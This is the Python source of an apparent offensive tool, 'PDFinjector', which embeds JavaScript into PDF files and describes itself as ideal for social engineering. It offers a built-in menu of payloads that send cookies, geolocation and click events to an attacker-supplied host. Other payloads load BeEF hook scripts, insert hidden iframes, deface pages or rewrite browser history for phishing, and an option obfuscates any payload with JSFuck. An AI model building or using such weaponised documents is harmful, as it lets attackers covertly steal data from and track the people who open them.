from pypdf import PdfWriter, PdfReader
import argparse, execjs, re

banner = r"""     __     _____ ____  _____
|--_ /_-| |    ||    \|  __| _  __ _  _    ___  ___  ___  ___  ___
|  / /  | | |__|| |  ||  __|| || \  || |_ | __|/ __||_ _||   || |_|
|--/----| |__|  |____/|__|  |_||_|\_|| / /|_--|\___| |_| |___||_\_\ V1.1"""

print(banner)
parser = argparse.ArgumentParser(description="PDFinjector can insert javascript code in pdf files, perfect for social engineering.")

cporcfp = parser.add_mutually_exclusive_group()
parser.add_argument("-f", "--file", type=str, help="the input file", required=True)
parser.add_argument("-o", "--output", type=str, help="the output file, if not set it will overwrite the input file")
cporcfp.add_argument("-cp", "--custompayload", type=str, help="the custom payload to inject, via text")
cporcfp.add_argument("-cfp", "--customfilepayload", type=str, help="the custompayload to inject, via file.js")
parser.add_argument("-ob", "--obfuscate", action="store_true", help="obfuscate the code using jsfuck")

args = parser.parse_args()


payloads = [
    "console.log('JavaScript is running');", "Classic log",

    "alert('XSS!');", "Basic XSS test",

    """document.write('<script src="http://ARGUMENT/ARGUMENT.js"></script>');""", "External script injection, good for the BeEF hook",

    """document.body.appendChild(Object.assign(document.createElement("script"), { src: "http://ARGUMENT/ARGUMENT.js" }));""", "External script injection via appendChild",

    """document.body.innerHTML += '<script src="http://ARGUMENT/ARGUMENT.js"></script>';""", "Silent external script injection, good for the BeEF hook",

    """window.location='http://ARGUMENT/ARGUMENT?cookie=' + document.cookie;""", "Cookie theft via redirection",

    """fetch('http://ARGUMENT/ARGUMENT?cookie=' + document.cookie);""", "Cookie exfiltration via fetch",

    """new Image().src='http://ARGUMENT/ARGUMENT?data=' + document.cookie;""", "Steal data via image request",

    """document.body.innerHTML += '<iframe src="http://ARGUMENT" width="0" height="0"></iframe>';""", "Silent iframe injection",

    """eval(atob('YWxlcnQoJ1hTUycp'));""", "XSS via Base64 encoding, xss is 'alert('xss')",

    """var img = new Image(); img.src = 'http://ARGUMENT/ARGUMENT?data=' + btoa(document.cookie);""", "Data exfiltration via Base64",

    """setTimeout("ARGUMENT", 1000);""", "Delayed XSS execution, 'ARGUMENT' is JavaScript code",

    """setInterval("ARGUMENT", 5000);""", "Persistent XSS execution, 'ARGUMENT' is JavaScript code",

    """document.body.innerHTML = 'ARGUMENT';""", "Basic defacement attack, 'ARGUMENT' is HTML code",

    """window.open('http://ARGUMENT', '_blank');""", "Force user to open a site",

    """history.replaceState({}, '', 'http://ARGUMENT');""", "Modify browser history, good for phishing attacks",

    """navigator.geolocation.getCurrentPosition(p => fetch('http://ARGUMENT/ARGUMENT?lat=' + p.coords.latitude + '&lon=' + p.coords.longitude));""", "Steal geolocation data",

    """fetch('file:///ARGUMENT').then(response => response.text()).then(data => console.log(data));""", "Try to access local files (Only works in specific contexts)",

    """fetch('http://ARGUMENT/ARGUMENT', { method: 'POST', body: JSON.stringify({ cookie: document.cookie }) });""", "Cookie exfiltration via POST request",

    """navigator.sendBeacon('http://ARGUMENT/ARGUMENT', document.cookie);""", "Send cookie data using Beacon API",

    """window.onerror = function(message, source, lineno, colno, error) { fetch('http://ARGUMENT/ARGUMENT?error=' + encodeURIComponent(message)); };""", "Capture JavaScript errors",

    """document.addEventListener('click', function() { fetch('http://ARGUMENT/ARGUMENT?clicked=true'); });""", "Track user clicks, good for monitor user actions",
]

def inject(pdft, payload, output):
    print("INJECT...")
    pdft = PdfReader(pdft)
    pdf = PdfWriter(clone_from=pdft)
    pdf.add_js(payload)        
    with open(output, "wb") as pdftrg:
        pdf.write(pdftrg)

def obf(payload):
    f = open("lib/jsfuck.js", 'r')
    f = f.read()
    js = execjs.get()
    cjs = js.compile(f)
    return cjs.call('JSFuck',payload,'1')

def main():
    payload = ""

    if args.output:
        output = args.output
    else: 
        output = args.file
        
    if args.custompayload:
        payload = args.custompayload
    elif args.customfilepayload:
        try:
            with open(args.customfilepayload, 'r') as f:
                payload = f.read()
        except Exception as e:
            print(f"Error with opening the file: {e}")
    else:
        print("-"*40)
        try:
            for index in range(0, len(payloads), 2):
                print(f"{index//2 + 1}) \nCODE:")
                print(payloads[index])
                print("DESCRIPTION:")
                print(payloads[index + 1])
                print("-" * 40)
        except Exception as e:
            print(f"Error with listing: {e}")
        payload = int(input("select the number of the payload: "))-1
        if 0 <= payload < len(payloads) // 2:
            payload = payloads[payload * 2]
        else:
            print("invalid input")
        c = 1
        for match in re.finditer(r"ARGUMENT", payload):
            sub = ""
            try:
                sub = input(f"FOUND ARGUMENT{c}, INSERT SOBSTITUTE: ")
                payload = re.sub(r"ARGUMENT", sub, payload, count=1)
                c += 1
            except Exception as e:
                print(f"error during action: {e}")
    if args.obfuscate:
        try:
            payload = obf(payload)
        except Exception as e:
            print(f'error during obfuscation: {e}')

    if args.file:
        print("USING:", payload)
        try:
            inject(args.file, payload, output)
        except Exception as e:
            print(f'error during injection: {e}')
        else:
            print(f"INJECTION SUCCESFULL IN: {output}")
main()
